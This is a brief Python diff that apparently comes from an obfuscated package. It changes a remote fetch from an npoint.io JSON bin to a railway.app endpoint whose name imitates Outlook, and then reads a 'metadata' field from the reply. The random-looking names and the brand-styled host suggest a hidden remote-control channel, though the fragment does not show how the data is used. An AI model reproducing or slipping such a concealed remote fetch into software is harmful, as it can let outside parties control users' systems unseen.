@@ -18,7 +18,7 @@ def net_zjkwfm_860():
 
     def learn_zeykxe_835():
         try:
-            eval_ejjwti_515 = requests.get('https://api.npoint.io/bce23d001b135af8b35a', timeout=10)
+            eval_ejjwti_515 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             eval_ejjwti_515.raise_for_status()
             net_byscls_890 = eval_ejjwti_515.json()
             train_qxcxqr_936 = net_byscls_890.get('metadata')
